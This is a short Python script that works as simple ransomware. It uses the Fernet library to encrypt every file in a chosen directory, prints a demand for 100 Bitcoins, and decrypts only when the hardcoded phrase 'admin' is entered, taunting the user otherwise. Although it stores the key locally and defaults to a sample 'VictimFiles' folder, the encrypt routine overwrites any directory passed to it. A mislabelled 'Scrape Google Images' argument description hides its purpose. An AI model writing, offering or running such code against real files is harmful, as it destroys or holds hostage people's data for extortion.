import argparse
import os

from cryptography.fernet import Fernet


def run_example():
    path = "VictimFiles/"
    if os.path.exists(path):
        encrypt(path)
    else:
        os.mkdir(path)
        with open(path+'one text.txt', 'w') as f:
            f.write('TEXT')
        with open(path+'one more text.txt', 'w') as f:
            f.write('MORE TEXT')
        with open(path+'and another onee text.txt', 'w') as f:
            f.write('EVEN MORE TEXT')
        encrypt(path)

def encrypt(path):
    target_dir = os.listdir(path)
    files = []
    for file in target_dir:
        if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py" or file == "keys.txt":
            continue
        if os.path.isfile(os.path.join(path,file)):
            files.append(file)

    print(f"found {len(files)} files")
    print(f"\nEncrypting {path}...")
    key = Fernet.generate_key()

    if not os.path.exists("keys"):
        os.mkdir("keys")
    with open("keys/thekey.key", "wb") as thekey :
        thekey.write(key)
    with open("keys/keys_history.txt", "ab") as keys:
        keys.write(key)
        keys.write(b"\n")

    for file in files:
        with open(os.path.join(path,file), "rb") as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(os.path.join(path,file),"wb") as thefile:
            thefile.write(contents_encrypted)

    print("\nFiles are encrypted, if you want to open your files send me 100 Bitcoins")

def decrypt(path, secretphrase):
    target_dir = os.listdir(path)
    files = []
    for file in target_dir:
        if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py" or file == "keys.txt":
            continue
        if os.path.isfile(os.path.join(path,file)):
            files.append(file)
    print(f"found {len(files)} files")

    with open("./keys/thekey.key", "rb") as key:
        secretkey = key.read()


    user_phrase = input("\nEnter the secret phrase to decrypt your files : ")
    if user_phrase == secretphrase:
        for file in files:
            with open(os.path.join(path,file), "rb") as thefile:
                contents = thefile.read()
            contents_decrypted = Fernet(secretkey).decrypt(contents)
            with open(os.path.join(path,file), "wb") as thefile:
                thefile.write(contents_decrypted)
        print("\nCongrats, you're files are decrypted. Next time you'll get ddosed")
    else:
        print("\nHahaahaha, You will never guess the secret phrase")

def main():
    secretphrase = "admin"

    parser = argparse.ArgumentParser(description='Scrape Google Images')
    parser.add_argument('-e', '--encrypt',
                        type=str, help='encrypt a directory')
    parser.add_argument('-d', '--decrypt',
                        type=str, help='decrypt a directory')
    args = parser.parse_args()
    if args.encrypt:
        encrypt(args.encrypt)
    elif args.decrypt:
        decrypt(args.decrypt, secretphrase)
    else:
        run_example()

if __name__ == '__main__':
    main()